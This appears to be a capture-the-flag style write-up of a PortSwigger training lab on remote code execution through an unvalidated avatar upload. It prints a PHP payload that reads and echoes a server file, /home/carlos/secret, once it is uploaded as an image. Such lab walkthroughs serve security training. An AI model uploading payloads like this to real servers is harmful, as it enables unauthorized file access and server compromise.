<img width="1058" height="621" alt="Screenshot_20261031_104409" src="https://github.com/user-attachments/assets/fe62f15d-77b1-4d62-918b-5d49201271c5" />Link: [Remote code execution via web shell upload](https://portswigger.net/web-security/file-upload/lab-file-upload-remote-code-execution-via-web-shell-upload)
Difficulty: Apprentice

# Action
```
This lab contains a vulnerable image upload function. It doesn't perform any validation on the files users upload before storing them on the server's filesystem.
```

From the lab description, I will try to draft a basic vulnerable PHP file using this [resource]()

After logging, users can upload to change their avatar profile pciture 
<img width="1919" height="995" alt="Screenshot_20261031_103640" src="https://github.com/user-attachments/assets/e57a33fb-cd3a-44cf-8d1d-6a232f812fc8" />

First, I draft a php payload
```
<?php
$filename = "/home/carlos/secret";

if (file_exists($filename)) {
    $content = file_get_contents($filename);
    echo $content;
} else {
    echo "The file does not exist.";
}
?>
```
Then I upload the payload to the avatar
<img width="1058" height="621" alt="Screenshot_20261031_104409" src="https://github.com/user-attachments/assets/3b468346-3e1f-4805-83dc-9cc60fad9007" />


After upload, the avatar will look like that and just open the Image in a new tab to view the secret

Happy Hacking!@#$@!$@!
